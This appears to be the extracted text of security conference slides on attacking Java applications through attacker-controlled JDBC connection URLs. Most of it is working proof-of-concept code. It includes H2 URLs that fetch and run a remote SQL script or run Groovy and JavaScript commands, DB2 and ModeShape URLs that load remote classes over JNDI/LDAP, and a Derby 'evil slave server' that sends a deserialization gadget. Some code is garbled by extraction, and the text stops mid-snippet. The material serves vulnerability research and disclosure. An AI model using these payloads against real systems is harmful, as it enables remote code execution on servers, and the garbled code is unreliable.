Make JDBC Attack Brilliant Again
Xu Yuanzhen(  @pyn3rd)
Chen Hongkun(  @Litch1)      
1.The derivation of JDBC attacking
2.In-depth analysis of occurred implementations
3.Set fire on JDBC of diverse applications
Agenda
Agenda
1.The derivation of JDBC attacking
2.In-depth analysis of occurred implementations
3.Set fire on JDBC of diverse applications
Agenda
Agenda
Java Database Connectivity
JDBCMysqlImpl
MySQL
JDBC
JDBCOracleImpl
JDBCSQLServerImpl
JDBCDB2mpl
Oracle
MsSQL
DB2
JDBC Driver
Standard Interface
Callback
Java Application
Not Recommended
Unportable
Callback
set evil JDBC URL
establish JDBC connection
execute payload with JDBC driver
Controllable JDBC URL
Class.forName(" com.mysql.cj.jdbc.Driver");
String url = "jdbc:mysql://localhost:3306/demo"
Connection conn = DriverManager.getConnection(url)
1.The derivation of JDBC attacking
2.In-depth analysis of occurred implementations
3.Set fire on JDBC of diverse applications
Agenda
Agenda
MySQL client arbitrary file reading vulnerability
• Affect many clients including JDBC driver
• LOAD DATA INFILE statement
establish JDBC connection
greeting packet
query packet
file transfer packet
Server
Client
MySQL JDBC client deserialization vulnerability
establish JDBC connection
read evil object from server
deserialize evil object
• Affected MySQL JDBC driver need to support specific properties
• gadgets are necessary
Server
Client
MySQL Connector/J – CVE-2017-3523
MySQL Connector/J offers features to support for automatic serialization and 
deserialization of Java objects, to make it easy to store arbitrary objects in the
database
• The flag "useServerPrepStmts" is set true to make MySQL Connector/J use server-side prepared 
statements
• The application is reading from a column having type BLOB, or the similar TINYBLOB, MEDIUMBLOB or 
LONGBLOB
• The application is reading from this column using .getString() or one of the functions reading 
numeric values (which are first read as strings and then parsed as numbers).
case Types.LONGVARBINARY:
if (!field.isBlob()) {
return extractStringFromNativeColumn(columnIndex, mysqlType);
} else if (!field.isBinary()) {
return extractStringFromNativeColumn(columnIndex, mysqlType);
} else {
byte[] data = getBytes(columnIndex);
Object obj = data;
if ((data != null) && (data.length >= 2)) {
if ((data[0] == -84) && (data[1] == -19)) {
// Serialized object?
try {
ByteArrayInputStream bytesIn = new ByteArrayInputStream(data);
ObjectInputStream objIn = new ObjectInputStream(bytesIn);
obj = objIn.readObject();
objIn.close();
bytesIn.close();
}
return obj.toString();
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
Properties
Properties
queryInterceptors
Versions
8.x
6.x
statementInterceptors
com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
>=5.1.11
 assistant");
if (！isNested())
this._createJDBCDataSourceForm = form = new CreateJDBCDataSourceForm( );
form.setName(getUniqueName("jdbc.datasources.createidbcdatasource.name. seed"));
form.setDatasourceType("GENERIC")
form.setCSRFToken(CSRFUtils.getSecret(getRequest()));
try {
ArrayListsLabelvalueBean > databaseTypes = getDatabaseTypes();
form.setDatabaseTypes(databaseTypes);
for (Iterator iter = databaseTypes.iterator(); iter.hasNext(); ) {
LabelvalueBean lvb = iter.next();
if (lvb.getvalue().equals("Oracle")) {
form.setSelectedDatabaseType(lvb.getValue());
break
}
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
Weblogic 0day - CVE-2020-2934
Attack other databases with JDBC drivers
spring.h2.console.enabled=true
spring.h2.console.settings.web-allow-others=true
Spring Boot H2 console case study
jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'
Construct payload with Groovy AST transformations
Why we use command "RUNSCRIPT"?
INIT = RUNSCRIPT FROM 'http://127.0.0.1:8000/poc.sql'
single line SQL
if (init != null) {
try {
CommandInterface command = session.prepareCommand(init,
Integer.MAX_VALUE);
command.executeUpdate(null);
} catch (DbException e) {
if (!ignoreUnknownSetting) {
session.close();
throw e;
}
}
}
1
2
3
4
5
6
7
8
9
10
11
12
13
In-depth analysis of source code
CREATE ALIAS RUNCMD AS $$$$;
CALL RUNCMD(command)
org.h2.util.SourceCompiler
javax.tools.JavaCompiler#getTask
javax.script.Compilable#compile
groovy.lang.GroovyCodeSource#parseClass
Java Source Code
JavaScript Source Code
Groovy Source Code
multiple lines SQL
Class compiledClass = compiled.get(packageAndClassName);
if (compiledClass != null) {
return compiledClass;
}
String source = sources.get(packageAndClassName);
if (isGroovySource(source)) {
Class clazz = GroovyCompiler.parseClass(source, packageAndClassName);
compiled.put(packageAndClassName, clazz);
return clazz;
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
Groovy Source Code
public static void main(String[] args) throws ClassNotFoundException, SQLException {
String groovy = "@groovy.transform.ASTTest(value={" +
"    assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")" +
"})" +
"def x";
String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '"+ groovy +"'";
Connection conn = DriverManager.getConnection(url);
conn.close();
Use @groovy.transform.ASTTEST to perform assertions on the AST
GroovyClassLoader.parseClass(…)
Is groovy dependency necessary?
private Trigger loadFromSource() {
SourceCompiler compiler = database.getCompiler();
synchronized (compiler) {
String fullClassName = Constants.USER_PACKAGE + ".trigger." + getName();
compiler.setSource(fullClassName, triggerSource);
try {
if (SourceCompiler.isJavaxScriptSource(triggerSource)) {
return (Trigger) compiler.getCompiledScript(fullClassName).eval();
} else {
final Method m = compiler.getMethod(fullClassName);
if (m.getParameterTypes().length > 0) {
throw new IllegalStateException("No parameters are allowed for a
trigger");
}
return (Trigger) m.invoke(null);
}
} catch (DbException e) {
throw e;
} catch (Exception e) {
throw DbException.get(ErrorCode.SYNTAX_ERROR_1, e, triggerSource);
}
}
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
"CREATE TRIGGER" NOT only compile but also invoke eval
public static void main(String[] args) throws ClassNotFoundException, SQLException {
String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"open -a Calculat
or\")";
String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER hhhh BEFORE SELECT ON 
INFORMATION_SCHEMA.CATALOGS AS '"+ javascript +"'";
Connection conn = DriverManager.getConnection(url);
conn.close();
1.The derivation of JDBC attacking
2.In-depth analysis of occurred implementations
3.Set fire on JDBC of diverse applications
Agenda
Agenda
IBM DB2 0day case 
clientRerouteServerListJNDINameIdentifies
a JNDI reference to a DB2ClientRerouteServerList instance in a JNDI repository of 
reroute server information.clientRerouteServerListJNDIName applies only to IBM Data 
Server Driver for JDBC and SQLJ type 4 connectivity, and to connections that are 
established through the DataSource interface.
If the value of clientRerouteServerListJNDIName is not null, 
clientRerouteServerListJNDIName provides the following functions:
•
Allows information about reroute servers to persist across JVMs
•
Provides an alternate server location if the first connection to the data source fails
public class c0 impLements PrivilegedExceptionAction { 
private Context a = null;
private String b;
public c0(Context var1, String var2) {
this.a = var1;
this.b = var2;
}
public Object run() throws NamingException { 
return this.a.Lookup(this.b);
}
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
Find out root cause
Set JDBC URL
Connect Succeeded
Lookup ServerList
Load Remote Codebase
Connect Failed
JDNI Injection RCE
Database
Manipulation
Construct JNDI injection RCE
clientRerouteServerListJNDIName = ldap://127.0.0.1:1389/evilClass;
public class DB2Test {
public static void main(String[] args) throws Exception {
Class.forName("com.ibm.db2.jcc.DB2Driver");
DriverManager.getConnection("jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=
ldap://127.0.0.1:1389/evilClass;");
}
}
Java Content Repository
Implementations
• Jackrabbit (Apache)
• CRX (Adobe)
• ModeShape
• eXo Platform
• Oracle Beehive
ModeShape
• JCR 2.0 implementation
• Restful APIs
• Sequencers
• Connectors
• …
JCR connectors
• Use JCR API to access data from other systems
• E.g. filesystem, Subversion, JDBC metadata…
?
ModeShape
JCR Repository
JCR Client Application
ModeShape gadget
• JCR Repositories involving JDBC
public class ModeShapeTest {
public static void main(String[] args) throws Exception {
Class.forName("org.modeshape.jdbc.LocalJcrDriver");
DriverManager.getConnection("jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass");
}
}
JBoss/Wildfly 0day case
• A JNDI URL that points the hierarchical database to an existing repository 
• A JNDI URL that points the hierarchical database to an evil LDAP service 
jdbc:jcr:jndi:ldap://127.0.0.1:1389/evilClass
jdbc:jcr:jndi:jcr:?repositoryName=repository
public class Socketconnection {
private final Socket socket;
private final ObjectOutputStream objOutputStream;
Private final ObjectInputstream objInputStream;
public SocketConnection(Socket var1) throws IOException {
this.socket = var1;
this.objOutputStream = new ObjectOutputStream(var1.getOutputStream());
this.objInputStream = new ObjectInputStream(var1.getInputStream());
}
public Object readMessage() throws cLassNotFoundException, IOException {  
return this.objInputStream.readObject();
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
Apache Derby
private class MasterReceiverThread extends Thread {
private final ReplicationMessage pongMsg = new ReplicationMessage(14, (Object)null);
MasterReceiverThread(String var2) {
super("derby.master.receiver-" + var2);
}
public void run() {
while(!ReplicationMessageTransmit.this.stopMessageReceiver) {
try {
ReplicationMessage var1 = this.readMessage();
switch(var1.getType()) {
case 11:
case 12:
synchronized(ReplicationMessageTransmit.this.receiveSemaphore) {
ReplicationMessageTransmit.this.receivedMsg = var1;
ReplicationMessageTransmit.this.receiveSemaphore.notify();
break;
}
case 13:
ReplicationMessageTransmit.this.sendMessage(this.pongMsg);
}
}
}
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
readObject()
readMessage()
MasterReceiverThread
set JDBC URL to make target
start as MASTER meanwhile 
appoint SLAVE
establish JDBC connection
read data stream from SLAVE
execute payload with JDBC driver
Master
Slave
readMessage()
startMaster=true
slaveHost=hostname
Construct JDBC connection
public class DerbyTest {
public static void main(String[] args) throws Exception{
Class.forName("org.apache.derby.jdbc.EmbeddedDriver");
DriverManager.getConnection("jdbc:derby:webdb;startMaster=true;slaveHost=127.0.0.1");
}
}
Evil slave server
public class EvilSlaveServer {
public static void main(String[] args) throws Exception {
int port = 4851;
ServerSocket server = new ServerSocket(port);
Socket socket = server.accept();
socket.getOutputStream().write(Serializer.serialize(
new CommonsBeanutils1().getObject("open -a Calculator")));
socket.getOutputStream().flush();
Thread.sleep(TimeUnit.SECONDS.toMillis(5));
socket.close();
server.close();
}
}
SQLite
If (JDBC URL is controllable) {
The database file content is controllable
}
How to exploit it？
private void open(int openModeFlags, int busyTimeout) throws SQLException {
// check the path to the file exists
if (!":memory:".equals(fileName) && !fileName.startsWith("file:") && 
!fileName.contains("mode=memory")) {
if (fileName.startsWith(RESOURCE_NAME_PREFIX)) {
String resourceName = fileName.substring(RESOURCE_NAME_PREFIX.length());
// search the class path
ClassLoader contextCL = Thread.currentThread().getContextClassLoader();
URL resourceAddr = contextCL.getResource(resourceName);
if (resourceAddr == null) {
try {
resourceAddr = new URL(resourceName);
}
catch (MalformedURLException e) {
throw new SQLException(String.format("resource %s not found: %s", resourceName, e));
}
}
try {
fileName = extractResource(resourceAddr).getAbsolutePath();
}
catch (IOException e) {
throw new SQLException(String.format("failed to load %s: %s", resourceName, e));
}
}
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
else {
// remove the old DB file
boolean deletionSucceeded = dbFile.delete();